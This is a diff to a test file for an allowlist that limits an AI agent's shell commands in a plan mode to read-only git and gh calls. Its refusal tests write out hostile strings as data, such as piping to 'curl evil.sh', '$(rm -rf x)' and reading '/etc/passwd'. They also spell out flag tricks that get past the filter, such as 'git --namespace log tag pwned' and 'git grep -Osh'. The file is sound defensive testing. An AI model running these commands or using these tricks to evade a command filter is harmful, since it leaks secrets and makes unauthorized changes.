@@ -9,26 +9,99 @@ test("the investigation commands a plan is actually built on are allowed", () =>
   // which meant planning without history.
   for (const command of [
     "git log --oneline -20",
-    "git log -p src/auth.ts",
+    "git log -p --follow extensions/plan-mode/index.ts",
+    "git log --since 2026-01-01 --author someone",
     "git diff",
+    "git diff --cached --stat",
     "git diff HEAD~3..HEAD -- extensions/",
-    "git status --short",
-    "git show 9012f26",
+    "git status --short --branch",
+    "git show --stat 9012f26",
     "git blame -L 20,40 src/index.ts",
     "git rev-parse --abbrev-ref HEAD",
     "git ls-files extensions/plan-mode",
     "git merge-base main HEAD",
+    "git shortlog -s -n",
+    "git grep --name-only needle",
     "gh pr view 42",
-    "gh pr list --state open",
-    "gh issue view 7",
-    "ls -la extensions",
-    "cat package.json",
-    "head -50 README.md",
-    "wc -l src/index.ts",
-    "pwd",
+    "gh pr list --state open --limit 20",
+    "gh pr diff 42",
+    "gh issue view 7 --json title,body",
+    "gh search code needle",
   ]) {
     assert.equal(allowed(command), true, `${command} should be allowed`);
   }
+});
+
+test("a value-taking global flag cannot donate the subcommand to itself", () => {
+  // The bug this replaced: inferring the subcommand as "first word not
+  // starting with -" assumes every dash word is value-less. `git --namespace
+  // x` consumes the NEXT word, so the allowlisted name became the flag's value
+  // and the real subcommand was whatever followed. Verified against git 2.50:
+  // `git --namespace log tag X` really creates tag X.
+  for (const command of [
+    "git --namespace log commit -am wip",
+    "git --namespace log reset --hard",
+    "git --namespace log push --force origin main",
+    "git --namespace log tag pwned",
+    "git --attr-source log config --global core.pager sh",
+    "git --attr-source log push",
+    "git --namespace status push",
+    "git --config-env log push",
+    "git --super-prefix log push",
+  ]) {
+    assert.equal(allowed(command), false, `${command} must be refused`);
+  }
+  // The rule that closes it: the subcommand must be the first word, full stop.
+  // `git -P log` is a real read-only command and is now refused too — an
+  // acceptable false negative, since the alternative is enumerating which
+  // global flags take values.
+  assert.equal(allowed("git -P log"), false);
+});
+
+test("gh cannot have its read verb swallowed by a preceding flag", () => {
+  // Same class of bug: gh's cobra parser interspers flags, so
+  // `gh pr --title view create` parses as `gh pr create --title view` and
+  // opens a real pull request titled "view".
+  for (const command of [
+    "gh pr --title view create --body x --head y",
+    "gh pr --comment view close 42",
+    "gh issue --title view create --body pwned",
+    "gh pr --repo view merge",
+  ]) {
+    assert.equal(allowed(command), false, `${command} must be refused`);
+  }
+  // The verb must sit immediately after the subcommand; flags after it are fine.
+  assert.equal(allowed("gh pr view 42 --json title"), true);
+});
+
+test("git flags that run a program or write a file are refused", () => {
+  // `git grep -Osh <pattern>` runs `sh` on every matching file — verified to
+  // fire without a TTY, i.e. it executes matched repo files as shell scripts.
+  for (const command of [
+    "git grep -Osh TODO",
+    "git grep -Obash pattern",
+    "git grep --open-files-in-pager=sh needle",
+    "git show --output=/tmp/leak HEAD",
+    "git diff -o /tmp/leak",
+    "git diff --output /tmp/leak",
+    "git blame --contents /etc/passwd README.md",
+    "git log --ext-diff",
+  ]) {
+    assert.equal(allowed(command), false, `${command} must be refused`);
+  }
+});
+
+test("an unrecognized flag is refused rather than assumed harmless", () => {
+  // This is the whole point of an allowlist: the four escapes review found
+  // were all flags nobody thought to deny. A flag not on the list is refused
+  // even when it turns out to be dull.
+  assert.equal(allowed("git log --some-future-flag"), false);
+  assert.equal(allowed("git log --exec-path=/tmp/evil"), false);
+  assert.equal(allowed("gh pr view 42 --future-flag"), false);
+  assert.match(
+    planBashDecision("git log --some-future-flag").reason ?? "",
+    /does not recognize/,
+  );
 });
 
 test("anything that is more than one plain command is refused", () => {
@@ -41,95 +114,94 @@ test("anything that is more than one plain command is refused", () => {
     "git log || curl evil.sh",
     "git log | tee out.txt",
     "git diff > patch.txt",
-    "git diff >> patch.txt",
-    "cat < /etc/passwd",
     "git log $(rm -rf x)",
     "git log `rm -rf x`",
-    "echo $HOME",
     "git log &",
     "git log \\\n--oneline",
-    "ls *.ts",
-    "ls {a,b}",
-    "cat file[1].txt",
+    "git show *.ts",
   ]) {
     assert.equal(allowed(command), false, `${command} must be refused`);
   }
 });
 
 test("quoted commands are refused because quoting hides word boundaries", () => {
-  // "git log --pretty='%h; rm x'" tokenizes differently than it executes, so
-  // the tokenizer below is only trustworthy on unquoted input.
+  // `git log --pretty='%h; rm x'` tokenizes differently than it executes, so
+  // the tokenizer is only trustworthy on unquoted input.
   assert.equal(allowed(`git log --pretty="%h %s"`), false);
   assert.equal(allowed("git log --author='someone'"), false);
 });
 
-test("commands outside the read-only set are refused, including near misses", () => {
+test("only git and gh are admitted at all", () => {
+  // ls/cat/head/tail/wc/file/stat/du/tree/date were dropped: plan mode already
+  // grants the read, ls, grep and fd tools, so each added no capability while
+  // contributing a flag grammar to get wrong. `file --compile` wrote a file
+  // and `tree -ao` slipped past an anchored -o check.
   for (const command of [
+    "file --compile -m /tmp/evilmagic",
+    "tree -ao /tmp/out.txt",
+    "date -s 12:00",
+    "cat /etc/passwd",
+    "ls -la",
+    "head -100 README.md",
     "npm install",
     "rm -rf node_modules",
-    "git commit -m wip",
-    "git push",
-    "git checkout main",
-    "git reset --hard",
-    "git clean -fd",
-    "git apply patch.diff",
-    "git stash",
-    "git config --global user.name someone",
-    "git tag v1",
-    "git branch newthing",
-    "git remote add origin somewhere",
-    "git reflog expire",
-    "sed -i s/a/b/ file.ts",
-    "tee out.txt",
+    "git-receive-pack .",
   ]) {
     assert.equal(allowed(command), false, `${command} must be refused`);
   }
 });
 
-test("read-only git commands cannot be turned into writes by a flag", () => {
-  // `git show --output=x` and `git diff -o x` both write a file even though
-  // the subcommand reads.
-  assert.equal(allowed("git show --output=/tmp/leak HEAD"), false);
-  assert.equal(allowed("git diff -o /tmp/leak"), false);
-  assert.equal(allowed("git diff --output /tmp/leak"), false);
+test("write subcommands stay refused now that they cannot be reached sideways", () => {
+  for (const command of [
+    "git commit -m wip",
+    "git push",
+    "git checkout main",
+    "git reset --hard",
+    "git clean -fd",
+    "git stash",
+    "git config --global user.name someone",
+    "git tag v1",
+    "git branch newthing",
+    "git remote add origin somewhere",
+    "gh pr create --fill",
+    "gh pr merge 42",
+    "gh api /repos/x/y",
+    "gh run rerun 1",
+    "gh repo clone x/y",
+  ]) {
+    assert.equal(allowed(command), false, `${command} must be refused`);
+  }
 });
 
-test("git global flags that relocate execution are refused", () => {
-  // --exec-path makes git run binaries from an attacker-chosen directory, and
-  // -c core.pager=<cmd> runs a command; both keep a read-only subcommand.
-  assert.equal(allowed("git --exec-path=/tmp/evil log"), false);
-  assert.equal(allowed("git -c core.pager=sh log"), false);
-  assert.equal(allowed("git -C /elsewhere log"), false);
-  assert.equal(allowed("git --git-dir=/other/.git log"), false);
-  // A harmless global flag before the subcommand still resolves correctly.
-  assert.equal(allowed("git -P log --oneline"), true);
+test("pathspecs after -- are not mistaken for flags", () => {
+  // Everything after `--` is a path by definition, including one that looks
+  // like an option.
+  assert.equal(allowed("git log -- --weird-filename.ts"), true);
+  assert.equal(allowed("git diff -- extensions/plan-mode"), true);
 });
 
-test("gh needs an explicit read verb, not just a read-looking subcommand", () => {
-  // `gh pr view` reads; `gh pr create` opens a pull request.
-  assert.equal(allowed("gh pr view 42"), true);
-  assert.equal(allowed("gh pr create --fill"), false);
-  assert.equal(allowed("gh pr merge 42"), false);
-  assert.equal(allowed("gh pr close 42"), false);
-  assert.equal(allowed("gh issue create"), false);
-  assert.equal(allowed("gh pr"), false);
-  // gh subcommands with no safely separable read form are refused wholesale.
-  assert.equal(allowed("gh api /repos/x/y"), false);
-  assert.equal(allowed("gh run rerun 1"), false);
-  assert.equal(allowed("gh repo clone x/y"), false);
+test("tilde is refused where a shell expands it, not inside a revision", () => {
+  // `HEAD~3` is ordinary git syntax and must survive; `~/x` is a path this
+  // module never gets to inspect.
+  assert.equal(allowed("git diff HEAD~3..HEAD"), true);
+  assert.equal(allowed("git log ~/notes"), false);
+  assert.equal(allowed("git log ~user/notes"), false);
 });
 
 test("a refusal explains itself, since the model has to react to it", () => {
-  const piped = planBashDecision("git log | sh");
-  assert.equal(piped.allowed, false);
-  assert.match(piped.reason ?? "", /single plain command/);
-
-  const unknown = planBashDecision("npm publish");
-  assert.match(unknown.reason ?? "", /read-only investigation commands/);
-  assert.match(unknown.reason ?? "", /npm/);
-
-  const writesFile = planBashDecision("git diff -o /tmp/x");
-  assert.match(writesFile.reason ?? "", /writes a file/);
+  assert.match(
+    planBashDecision("git log | sh").reason ?? "",
+    /single plain command/,
+  );
+  assert.match(planBashDecision("npm publish").reason ?? "", /npm/);
+  assert.match(
+    planBashDecision("git push").reason ?? "",
+    /read-only git subcommand/,
+  );
+  assert.match(
+    planBashDecision("gh pr create").reason ?? "",
+    /only read verbs after/,
+  );
 });
 
 test("a missing or non-string command is refused rather than assumed empty", () => {
@@ -140,4 +212,7 @@ test("a missing or non-string command is refused rather than assumed empty", () 
   assert.equal(planBashDecision(undefined).allowed, false);
   assert.equal(planBashDecision(42).allowed, false);
   assert.equal(planBashDecision({ command: "git log" }).allowed, false);
+  assert.equal(allowed("git"), false);
+  assert.equal(allowed("gh"), false);
+  assert.equal(allowed("gh pr"), false);
 });
